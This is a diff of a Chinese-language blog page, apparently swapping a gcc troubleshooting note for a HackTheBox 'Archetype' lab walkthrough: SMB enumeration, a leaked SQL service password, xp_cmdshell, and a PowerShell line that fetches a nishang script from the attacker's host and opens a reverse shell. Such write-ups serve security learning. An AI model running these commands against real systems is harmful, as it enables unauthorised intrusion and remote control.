@@ -20,28 +20,43 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"railgun.icu","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="cc1导致无法正常编译问题现象 gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory 解决方法 export PATH&#x3D;$PATH 然后重新编译">
+<meta name="description" content="对靶机进行扫描nmap -A 10.10.10.27">
 <meta property="og:type" content="article">
-<meta property="og:title" content="提权时遇到过的坑">
-<meta property="og:url" content="https://railgun.icu/2021/08/11/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/index.html">
+<meta property="og:title" content="HackTheBox-Archetype">
+<meta property="og:url" content="https://railgun.icu/2022/01/05/htb-Archetype/index.html">
 <meta property="og:site_name" content="Misaka&#39;s Blog">
-<meta property="og:description" content="cc1导致无法正常编译问题现象 gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory 解决方法 export PATH&#x3D;$PATH 然后重新编译">
+<meta property="og:description" content="对靶机进行扫描nmap -A 10.10.10.27">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-08-11T02:08:20.000Z">
-<meta property="article:modified_time" content="2021-12-25T07:58:49.894Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140005225.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140008420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140009670.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140011153.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140012120.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141310630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141313585.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141401893.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141417163.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141419525.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141425669.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141426667.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141433819.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141447271.png">
+<meta property="article:published_time" content="2022-01-05T06:08:30.000Z">
+<meta property="article:modified_time" content="2022-02-20T15:03:06.747Z">
 <meta property="article:author" content="Misaka">
-<meta property="article:tag" content="Exploit">
+<meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140005225.png">
 
 
-<link rel="canonical" href="https://railgun.icu/2021/08/11/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/">
+<link rel="canonical" href="https://railgun.icu/2022/01/05/htb-Archetype/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://railgun.icu/2021/08/11/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/","path":"2021/08/11/提权时遇到过的坑/","title":"提权时遇到过的坑"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://railgun.icu/2022/01/05/htb-Archetype/","path":"2022/01/05/htb-Archetype/","title":"HackTheBox-Archetype"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>提权时遇到过的坑 | Misaka's Blog</title>
+<title>HackTheBox-Archetype | Misaka's Blog</title>
   
 
 
@@ -106,7 +121,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -119,7 +134,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cc1%E5%AF%BC%E8%87%B4%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%BC%96%E8%AF%91"><span class="nav-number">1.</span> <span class="nav-text">cc1导致无法正常编译</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -197,7 +211,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://railgun.icu/2021/08/11/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/">
+    <link itemprop="mainEntityOfPage" href="https://railgun.icu/2022/01/05/htb-Archetype/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -210,7 +224,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          提权时遇到过的坑
+          HackTheBox-Archetype
         </h1>
 
         <div class="post-meta-container">
@@ -221,14 +235,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2021-08-11 10:08:20" itemprop="dateCreated datePublished" datetime="2021-08-11T10:08:20+08:00">2021-08-11</time>
+      <time title="创建时间：2022-01-05 14:08:30" itemprop="dateCreated datePublished" datetime="2022-01-05T14:08:30+08:00">2022-01-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2021-12-25 15:58:49" itemprop="dateModified" datetime="2021-12-25T15:58:49+08:00">2021-12-25</time>
+      <time title="修改时间：2022-02-20 23:03:06" itemprop="dateModified" datetime="2022-02-20T23:03:06+08:00">2022-02-20</time>
     </span>
 
   
@@ -241,11 +255,52 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="cc1导致无法正常编译"><a href="#cc1导致无法正常编译" class="headerlink" title="cc1导致无法正常编译"></a>cc1导致无法正常编译</h1><p>问题现象 <code>gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</code></p>
-<p>解决方法 <code>export PATH=$PATH</code> 然后重新编译</p>
+        <p>对靶机进行扫描<code>nmap -A 10.10.10.27</code></p>
 <span id="more"></span>
 
-<p>在反弹shell之后,局部环境变量发生改变,需要重新导出?</p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140005225.png"></p>
+<ol>
+<li><p>445/tcp端口,用于Windows系统的共享文件夹</p>
+</li>
+<li><p>1433/tcp端口,用于MSSQL端口</p>
+</li>
+</ol>
+<p>首先对445端口的共享文件夹进行查看</p>
+<p><code>smbclient -N -L 10.10.10.27</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140008420.png"></p>
+<p>尝试对文件夹内的内容进行读取</p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140009670.png"></p>
+<p><code>prod.dtsConfig</code>文件内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;</span><br><span class="line">    &lt;/DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br><span class="line">    &lt;/Configuration&gt;</span><br><span class="line">&lt;/DTSConfiguration&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以知道用户名为<code>ARCHETYPE\sql_svc</code>,而密码为<code>M3g4c0rp123</code></p>
+<p>用<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>下的<code>examples/mssqlclient.py</code>进行数据库连接</p>
+<p><code>python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140011153.png"></p>
+<p>用<code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code>查看当前权限</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples">https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IF IS_SRVROLEMEMBER (<span class="string">&#x27;sysadmin&#x27;</span>) <span class="operator">=</span> <span class="number">1</span>  </span><br><span class="line">   print <span class="string">&#x27;Current user&#x27;&#x27;s login is a member of the sysadmin role&#x27;</span>  </span><br><span class="line"><span class="keyword">ELSE</span> IF IS_SRVROLEMEMBER (<span class="string">&#x27;sysadmin&#x27;</span>) <span class="operator">=</span> <span class="number">0</span>  </span><br><span class="line">   print <span class="string">&#x27;Current user&#x27;&#x27;s login is NOT a member of the sysadmin role&#x27;</span>  </span><br><span class="line"><span class="keyword">ELSE</span> IF IS_SRVROLEMEMBER (<span class="string">&#x27;sysadmin&#x27;</span>) <span class="keyword">IS</span> <span class="keyword">NULL</span>  </span><br><span class="line">   print <span class="string">&#x27;ERROR: The server role specified is not valid.&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140012120.png"></p>
+<p>当前权限为<code>sysadmin</code></p>
+<p>开启<code>xp_cmdshell</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141310630.png"></p>
+<p>网络状况</p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141313585.png"></p>
+<p>在<code>C:\Users\sql_svc\Desktop\</code>找到<code>user flag</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141401893.png"></p>
+<p>用<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">nishang</a>反弹shell</p>
+<p><code>xp_cmdshell &quot;powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.45:8000/Invoke-PowerShellTcp.ps1\&quot;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.45 -port 8080&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141417163.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141419525.png"></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/powershell/module/psreadline/about/about_psreadline?view=powershell-7.2#command-history">命令历史记录</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141425669.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141426667.png"></p>
+<p>psexec连接服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141433819.png"></p>
+<p>手动开了3389但是连不上??</p>
+<p>在<code>C:\Users\Administrator\Desktop\</code>找到<code>root flag</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141447271.png"></p>
 
     </div>
 
@@ -255,20 +310,20 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Exploit/" rel="tag"># Exploit</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/07/18/vulnhub-LAMPSECURITY_CTF4/" rel="prev" title="LAMPSECURITY:CTF4">
-                  <i class="fa fa-chevron-left"></i> LAMPSECURITY:CTF4
+                <a href="/2022/01/04/htb-Backdoor/" rel="prev" title="HackTheBox-Backdoor">
+                  <i class="fa fa-chevron-left"></i> HackTheBox-Backdoor
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/09/11/JNU-mentohust/" rel="next" title="JNU-mentohust">
-                  JNU-mentohust <i class="fa fa-chevron-right"></i>
+                <a href="/2022/01/06/htb-Bolt/" rel="next" title="HackTheBox-Bolt">
+                  HackTheBox-Bolt <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
